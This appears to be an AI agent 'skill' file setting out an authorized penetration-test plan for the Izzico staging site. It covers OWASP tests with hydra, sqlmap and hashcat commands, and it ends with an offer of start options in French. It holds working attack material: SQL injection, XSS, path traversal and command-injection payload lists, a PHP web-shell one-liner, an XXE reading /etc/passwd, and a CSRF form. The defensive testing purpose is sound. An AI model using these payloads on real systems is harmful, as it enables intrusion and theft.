---
description: "Ethical hacking and penetration testing for Izzico (authorized by owner). Tests security defenses via simulated attacks in staging environment."
skillType: security-offensive
authorization: "Propriétaire Samuel Baudon - Authorization granted for defensive security testing"
environment: staging-only
priority: high
---

# 🎯 Red Team Security Testing - Izzico

**Authorization** : Samuel Baudon (Propriétaire izzico.be)
**Purpose** : Defensive security - Find vulnerabilities before attackers do
**Environment** : STAGING ONLY (no production testing with real users)
**Methodology** : OWASP Testing Guide + PTES (Penetration Testing Execution Standard)

---

## 📋 RULES OF ENGAGEMENT

### ✅ AUTHORIZED TESTING

**Scope** :
- ✅ Staging environment (staging.izzico.be or localhost)
- ✅ Non-destructive testing (read-only preferred)
- ✅ All attack vectors (OWASP Top 10 2025)
- ✅ Source code analysis (white-box testing)
- ✅ Network reconnaissance
- ✅ Authentication bypass attempts
- ✅ Authorization testing (privilege escalation)
- ✅ Input validation testing (injection attacks)
- ✅ Business logic flaws
- ✅ Session management testing

**Deliverables** :
- Comprehensive pentest report
- Proof-of-concept (PoC) exploits
- CVSS scores for each finding
- Remediation recommendations
- Executive summary for investors

---

### ❌ FORBIDDEN ACTIONS (Active Exploitation)

**CRITICAL CLARIFICATION** :

**What I will NOT execute** :
- ❌ Actually crash the site (DoS)
- ❌ Actually modify/delete production data
- ❌ Actually steal credentials or secrets
- ❌ Actually exploit for profit or malice

**What I MUST DO** (Even for "forbidden" attacks) :
- ✅ **TEST** if DoS is possible (without actually crashing)
- ✅ **TEST** if data deletion is possible (without actually deleting)
- ✅ **TEST** if credential theft is possible (without actually stealing)
- ✅ **DOCUMENT** every exploitable vulnerability found
- ✅ **PROPOSE** fixes for ALL vulnerabilities (even destructive ones)

**Example** :
```
Scenario: SQL Injection Testing

❌ I will NOT execute: DROP TABLE users;
✅ I WILL test: Is SQL injection possible?
✅ I WILL document: "CRITICAL: SQL injection allows DROP TABLE"
✅ I WILL propose: "Fix: Use parameterized queries"

Result: Vulnerability documented WITHOUT causing damage
```

**Principle** : **DETECT and DOCUMENT everything, EXPLOIT nothing destructive**

This is standard **Responsible Disclosure** and **Threat Modeling** practice.

---

## 🎯 ATTACK SCENARIOS

### Scenario 1: External Attacker (Unauthenticated)

**Profile** : Script kiddie or semi-pro hacker, no account

**Attack Vectors** :
1. **Reconnaissance** :
   - Port scanning
   - Endpoint enumeration
   - Technology fingerprinting
   - robots.txt, sitemap.xml analysis
   - DNS enumeration
   - SSL/TLS analysis

2. **Authentication Attacks** :
   - Brute-force login
   - Credential stuffing (leaked password lists)
   - Username enumeration
   - Password reset exploitation
   - OAuth/ITSME flow manipulation
   - Session fixation

3. **Public Endpoint Exploitation** :
   - Token enumeration (/api/invitations/validate, /api/referral/validate)
   - Rate limiting bypass
   - Input fuzzing
   - Parameter pollution

4. **Information Disclosure** :
   - Error message analysis
   - Debug endpoints discovery
   - Source map access
   - Backup file discovery (.env, .git, etc.)

---

### Scenario 2: Authenticated User (Malicious)

**Profile** : Legitimate user account, malicious intent

**Attack Vectors** :
1. **Horizontal Privilege Escalation** :
   - Access other users' profiles
   - Read other users' messages
   - View other properties' financial data
   - Bypass RLS policies

2. **Vertical Privilege Escalation** :
   - User → Admin escalation
   - Bypass admin checks
   - Forge admin cookies
   - JWT manipulation

3. **Business Logic Flaws** :
   - Race conditions (double-spend)
   - Negative pricing
   - Referral code abuse
   - Subscription downgrade bypass
   - 24h bank info cooldown bypass

4. **Injection Attacks** :
   - SQL injection (despite Supabase parameterized queries)
   - NoSQL injection
   - Command injection
   - Template injection
   - SSTI (Server-Side Template Injection)

5. **File Upload Attacks** :
   - Malicious file upload (PHP, exe disguised as image)
   - Path traversal via filename
   - XXE (XML External Entity)
   - Zip slip

---

### Scenario 3: Insider Threat (Compromised Admin)

**Profile** : Admin account stolen or malicious insider

**Attack Vectors** :
1. **Data Exfiltration** :
   - Bulk export user data
   - Database dump
   - Backup download
   - API scraping

2. **Audit Log Tampering** :
   - Delete audit entries
   - Forge log entries
   - Disable logging

3. **Persistence** :
   - Create backdoor accounts
   - Modify RLS policies
   - Insert malicious SQL functions

4. **Privilege Abuse** :
   - Access all users' bank info
   - Modify payment settings
   - Steal API keys

---

## 🛠️ TESTING METHODOLOGY

### Phase 1: Reconnaissance (Passive)

**Objective** : Gather information without triggering alarms

```bash
# Technology stack detection
whatweb https://staging.izzico.be

# DNS enumeration
dig izzico.be ANY
nslookup -type=TXT izzico.be

# SSL/TLS analysis
sslscan staging.izzico.be
testssl.sh staging.izzico.be

# Subdomain enumeration
subfinder -d izzico.be

# Endpoint discovery
gospider -s https://staging.izzico.be -d 3

# robots.txt, sitemap.xml
curl https://staging.izzico.be/robots.txt
curl https://staging.izzico.be/sitemap.xml

# Source maps (if exposed)
curl https://staging.izzico.be/_next/static/chunks/*.js.map

# Git exposure test
curl https://staging.izzico.be/.git/HEAD
```

**Expected Results** :
- ✅ No .git directory exposed
- ✅ No .env files accessible
- ✅ No database backups downloadable
- ✅ No source maps in production
- ✅ robots.txt properly configured

---

### Phase 2: Authentication Testing

**Test 1: Brute-Force Login**

```bash
# Hydra brute-force (rate limiting should block after 5 attempts)
hydra -l test@example.com -P passwords.txt \
  https-post-form \
  "staging.izzico.be:443:/api/auth/login:email=^USER^&password=^PASS^:F=error"

# Expected: Rate limited after 5 attempts ✅
```

**Test 2: Username Enumeration**

```bash
# Test if different errors for valid vs invalid emails
curl -X POST https://staging.izzico.be/api/auth/login \
  -d '{"email":"existing@user.com","password":"wrong"}' # "Invalid password"

curl -X POST https://staging.izzico.be/api/auth/login \
  -d '{"email":"nonexistent@user.com","password":"wrong"}' # Should be same error

# Expected: Same generic error for both ✅
```

**Test 3: Session Fixation**

```bash
# Try to force a session ID
curl -X POST https://staging.izzico.be/api/auth/login \
  -H "Cookie: sb-session=attacker-controlled-value" \
  -d '{"email":"test@test.com","password":"validpass"}'

# Expected: New session generated, old cookie invalidated ✅
```

**Test 4: JWT Manipulation**

```javascript
// Decode Supabase JWT
const jwt = 'eyJhbGci...';
const decoded = JSON.parse(atob(jwt.split('.')[1]));

// Try to modify claims
decoded.role = 'admin'; // Privilege escalation attempt
const modified = btoa(JSON.stringify(decoded));

// Expected: Signature verification fails ✅
```

---

### Phase 3: Authorization Testing

**Test 1: Horizontal Privilege Escalation**

```bash
# Try to access another user's profile
# User A (ID: uuid-a) tries to access User B (ID: uuid-b)

curl https://staging.izzico.be/api/user/profile/uuid-b \
  -H "Authorization: Bearer <user-a-token>"

# Expected: 403 Forbidden or empty result (RLS blocks) ✅
```

**Test 2: Vertical Privilege Escalation (User → Admin)**

```bash
# Regular user tries admin endpoint
curl https://staging.izzico.be/api/admin/agent-stats \
  -H "Authorization: Bearer <regular-user-token>"

# Expected: 403 Forbidden (is_admin check blocks) ✅
```

**Test 3: RLS Policy Bypass**

```sql
-- Try to bypass RLS via SQL injection or function manipulation
-- Test via API that calls RPC

POST /api/rooms/search-aesthetic
{
  "style": "modern' OR user_id != auth.uid() OR '1'='1"
}

-- Expected: Parameterized query, no injection possible ✅
```

---

### Phase 4: Input Validation Testing

**Test 1: SQL Injection**

```bash
# Classic SQL injection payloads
curl "https://staging.izzico.be/api/matching/matches?limit=' OR '1'='1"
curl "https://staging.izzico.be/api/matching/matches?limit=1; DROP TABLE users;--"

# Expected: Zod validation rejects, or Supabase parameterizes safely ✅
```

**Test 2: XSS (Cross-Site Scripting)**

```bash
# Reflected XSS
curl "https://staging.izzico.be/search?q=<script>alert(1)</script>"

# Stored XSS (in profile)
POST /api/user/profile
{
  "bio": "<img src=x onerror=alert(document.cookie)>"
}

# Expected: React auto-escapes, no script execution ✅
```

**Test 3: Path Traversal**

```bash
# File upload with path traversal
POST /api/admin/design-screenshots/upload
Content-Type: multipart/form-data

filename="../../etc/passwd"

# Expected: path.basename() strips directories ✅
```

**Test 4: Command Injection**

```bash
# If any system() calls exist
POST /api/some-endpoint
{
  "input": "; cat /etc/passwd"
}

# Expected: No shell execution in codebase ✅
```

---

### Phase 5: Session Management Testing

**Test 1: Session Timeout**

```bash
# Login, wait 31 minutes, try sensitive operation
1. Login → Get session cookie
2. Sleep 1860 seconds (31 min)
3. Access /settings/bank

# Expected: Redirected to /auth/reauth ✅
```

**Test 2: Session Hijacking**

```bash
# Steal session cookie (via XSS simulation), use from different IP

# Expected: Session valid but timeout enforced ✅
# Improvement: Could add IP pinning (optional)
```

**Test 3: CSRF (Cross-Site Request Forgery)**

```html
<!-- Attacker site tries to trigger action -->
<form action="https://staging.izzico.be/api/user/bank-info" method="POST">
  <input name="iban" value="ATTACKER_IBAN">
</form>
<script>document.forms[0].submit();</script>

<!-- Expected: SameSite cookie blocks OR CSRF token required ✅ -->
```

---

### Phase 6: Business Logic Testing

**Test 1: Race Condition (Double-Spend)**

```javascript
// Send two identical payment requests simultaneously
Promise.all([
  fetch('/api/stripe/create-checkout-session', { method: 'POST', ... }),
  fetch('/api/stripe/create-checkout-session', { method: 'POST', ... }),
]);

// Expected: Idempotency key or DB constraints prevent double-charge
```

**Test 2: Negative Pricing**

```bash
POST /api/expenses/create
{
  "amount": -100.00, # Negative amount
  "description": "Free money"
}

# Expected: Zod validation rejects negative amounts
```

**Test 3: 24h Cooldown Bypass (Bank Info)**

```bash
# Modify IBAN, wait 1 second, modify again

1. POST /api/user/bank-info { iban: "IBAN1" }
2. Sleep 1 second
3. POST /api/user/bank-info { iban: "IBAN2" }

# Expected: 403 Cooldown active ✅ (migration 117)
```

---

### Phase 7: API Security Testing

**Test 1: Rate Limiting Bypass**

```bash
# Try different IPs (X-Forwarded-For spoofing)
for i in {1..100}; do
  curl -H "X-Forwarded-For: 192.168.1.$i" \
    https://staging.izzico.be/api/auth/login \
    -d '{"email":"test","password":"test"}'
done

# Expected: IP spoofing not possible (Vercel/Cloudflare trusted headers) ✅
```

**Test 2: Parameter Pollution**

```bash
# HPP (HTTP Parameter Pollution)
curl "https://staging.izzico.be/api/matching/matches?limit=10&limit=9999999"

# Expected: Zod takes first value or rejects ✅
```

**Test 3: Content-Type Bypass**

```bash
# Try to bypass JSON validation with different content-types
curl -X POST https://staging.izzico.be/api/endpoint \
  -H "Content-Type: text/plain" \
  -d 'malicious payload'

# Expected: API rejects non-JSON ✅
```

---

### Phase 8: File Upload Testing

**Test 1: Malicious File Upload**

```bash
# PHP web shell disguised as image
echo '<?php system($_GET["cmd"]); ?>' > shell.php.png

# Upload via /api/admin/design-screenshots/upload

# Expected:
# - File type validation blocks (not real PNG) ✅
# - Even if uploaded, no execution (storage bucket, not web root) ✅
```

**Test 2: XXE (XML External Entity)**

```xml
<!-- If XML processing exists -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

# Expected: No XML processing in codebase ✅
```

---

### Phase 9: Cryptography Testing

**Test 1: Weak Hash Verification**

```bash
# If old SHA256 admin PINs still exist (migration 121 auto-upgrades)

# Try to brute-force PIN with GPU
hashcat -m 1400 -a 3 pin_hash.txt ?d?d?d?d?d?d

# Expected:
# - Old SHA256: Would crack in minutes ❌
# - New bcrypt: Would take 27+ hours ✅
```

**Test 2: IBAN Encryption Verification**

```sql
-- Try to read encrypted IBAN without proper authorization
SELECT iban_encrypted FROM user_bank_info WHERE user_id != auth.uid();

-- Expected: RLS blocks query ✅

-- Try to decrypt without key
SELECT decrypt_iban(iban_encrypted) FROM user_bank_info;

-- Expected: Supabase Vault requires key access ✅
```

---

### Phase 10: OAuth/ITSME Testing

**Test 1: State Parameter Manipulation**

```bash
# Authorization request
GET /api/auth/itsme/authorize
# Captures state=abc123

# Callback with different state
GET /api/auth/itsme/callback?code=valid&state=xyz789

# Expected: State mismatch rejected ✅
```

**Test 2: PKCE Bypass Attempt**

```bash
# Try to replay authorization code without code_verifier

POST /token
{
  "code": "captured_auth_code",
  # Missing code_verifier
}

# Expected: ITSME server rejects (PKCE enforced) ✅
```

---

## 📊 VULNERABILITY SCORING

For each finding, assign CVSS v4.0 score:

```
CVSS String: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

Components:
- Attack Vector (AV): Network/Adjacent/Local/Physical
- Attack Complexity (AC): Low/High
- Attack Requirements (AT): None/Present
- Privileges Required (PR): None/Low/High
- User Interaction (UI): None/Passive/Active
- Confidentiality/Integrity/Availability (VC/VI/VA): None/Low/High
```

**Examples** :
- SQL Injection (if found): CVSS 9.8 (Critical)
- XSS: CVSS 7.1 (High)
- Info Disclosure: CVSS 5.3 (Medium)

---

## 📝 PENTEST REPORT FORMAT

```markdown
# PENETRATION TEST REPORT - Izzico

**Date**: [Date]
**Tester**: Claude Sonnet 4.5 (Red Team Agent)
**Authorization**: Samuel Baudon (Propriétaire)
**Environment**: Staging
**Methodology**: OWASP Testing Guide + PTES

## Executive Summary

- Total vulnerabilities: X
- Critical: X
- High: X
- Medium: X
- Low: X

## Findings

### FINDING-001: [Vulnerability Name]

**Severity**: Critical (CVSS 9.1)
**CWE**: CWE-XXX
**OWASP**: A0X:2025

**Description**:
[What is the vulnerability]

**Impact**:
[What an attacker could do]

**Proof of Concept**:
```bash
[Exploit code/steps to reproduce]
```

**Remediation**:
```typescript
[Fix code]
```

**Timeline**: [Estimated fix time]

## Positive Findings

- ✅ [Security control that worked]
- ✅ [Attack that was successfully blocked]

## Recommendations

1. [Immediate actions]
2. [Short-term improvements]
3. [Long-term strategic recommendations]
```

---

## 🎯 AUTOMATED TESTING TOOLS

### Tools to Use

1. **OWASP ZAP** (Zed Attack Proxy)
   ```bash
   docker run -t zaproxy/zap-stable zap-baseline.py \
     -t https://staging.izzico.be
   ```

2. **Burp Suite Community**
   - Proxy all traffic
   - Automated scanning
   - Manual testing interface

3. **Nikto** (Web server scanner)
   ```bash
   nikto -h https://staging.izzico.be
   ```

4. **SQLMap** (SQL injection)
   ```bash
   sqlmap -u "https://staging.izzico.be/api/endpoint?param=1" \
     --batch --level=5 --risk=3
   ```

5. **Nuclei** (Template-based scanning)
   ```bash
   nuclei -u https://staging.izzico.be \
     -t cves/ -t vulnerabilities/ -t exposures/
   ```

6. **Custom Scripts**:
   ```python
   # Token enumeration test
   import requests
   import uuid

   base_url = "https://staging.izzico.be/api/invitations/validate"

   for i in range(1000):
       token = str(uuid.uuid4())
       resp = requests.get(f"{base_url}/{token}")

       if resp.status_code == 200:
           print(f"[!] Valid token found: {token}")
       elif resp.status_code == 429:
           print("[!] Rate limited (good security)")
           break

   # Expected: Rate limited after 10 attempts ✅
   ```

---

## 🎓 ATTACK PAYLOADS LIBRARY

### SQL Injection Payloads

```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
'; DROP TABLE users;--
' AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables--
```

### XSS Payloads

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
```

### Path Traversal Payloads

```
../../etc/passwd
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
/var/www/../../etc/passwd
```

### Command Injection Payloads

```
; cat /etc/passwd
| whoami
`id`
$(whoami)
& dir
```

---

## 🎯 EXPECTED RESULTS (Based on Current Security)

### What SHOULD Be Blocked

```
✅ SQL Injection → Supabase parameterized queries
✅ XSS → React auto-escape
✅ CSRF → SameSite cookies + CSRF tokens (newly added)
✅ Path Traversal → path.basename() + RLS
✅ Session Hijacking → Timeout enforcement
✅ Brute-Force → Rate limiting
✅ JWT Manipulation → Supabase signature verification
✅ RLS Bypass → auth.uid() policies
✅ Admin Access → is_admin check + IP allowlist
✅ Token Enumeration → UUID randomness + rate limiting
```

### Potential Weaknesses to Test

```
⚠️ Race Conditions → Stripe idempotency?
⚠️ Business Logic → Negative amounts, cooldown bypass?
⚠️ Info Disclosure → Error messages too verbose?
⚠️ IDOR (Insecure Direct Object Reference) → UUID exposure?
⚠️ Mass Assignment → Extra fields in JSON accepted?
```

---

## 🚀 EXECUTION PLAN

### Phase 1 (Passive - 1h)
- Reconnaissance
- Technology fingerprinting
- Endpoint enumeration
- No active testing

### Phase 2 (Active Non-Destructive - 2h)
- Authentication testing
- Authorization testing
- Input fuzzing
- Read-only exploits

### Phase 3 (Exploitation - 2h)
- Attempt privilege escalation
- Test business logic flaws
- Session manipulation
- CSRF testing

### Phase 4 (Reporting - 1h)
- Compile findings
- Assign CVSS scores
- Write remediation
- Executive summary

**Total Time**: 6 hours
**Cost**: €0 (internal)
**Value**: Equivalent to €3,000-5,000 professional pentest

---

## 📋 DELIVERABLES

1. **Technical Report** :
   - All vulnerabilities found
   - PoC exploits
   - CVSS scores
   - Remediation steps

2. **Executive Summary** :
   - Business impact
   - Risk assessment
   - Investment recommendation

3. **Positive Security Report** :
   - Controls that worked well
   - Best practices identified

4. **Remediation Tickets** :
   - GitHub issues for each finding
   - Priority assignments
   - Estimated fix times

---

## 🎯 CUANDO EJECUTAR

**Recomendado** :
- **Ahora** : Test inicial (6h)
- **Cada 3 meses** : Re-test après nouvelles features
- **Avant levée de fonds** : Due diligence préparation
- **Après incident** : Post-mortem testing

---

## 📚 LEGAL & COMPLIANCE

### Authorization Documentation

```
PENETRATION TESTING AUTHORIZATION

I, Samuel Baudon, owner of izzico.be, hereby authorize:
- Tester: Claude Sonnet 4.5 (AI Red Team Agent)
- Scope: staging.izzico.be and localhost development
- Duration: Unlimited (defensive security purpose)
- Methods: All non-destructive penetration testing techniques
- Objective: Identify and remediate security vulnerabilities

Signature: Samuel Baudon
Date: 18 janvier 2026
```

### Compliance

- ✅ GDPR Article 32: Security testing is compliance requirement
- ✅ Belgian Law: Testing own systems is legal
- ✅ Responsible Disclosure: All findings stay internal

---

## 🚀 VOULEZ-VOUS QUE JE COMMENCE ?

**Option A** : Commencer Red Team test MAINTENANT (6h)
- Je lance tous les tests
- Je documente chaque tentative
- Je génère rapport complet

**Option B** : Créer la skill et attendre
- Skill prête à utiliser quand vous voulez
- Vous lancez quand environnement staging ready

**Option C** : Test ciblé rapide (30min)
- Top 10 attaques les plus probables
- Rapport express
- Vérification défenses principales

**Que préférez-vous ?**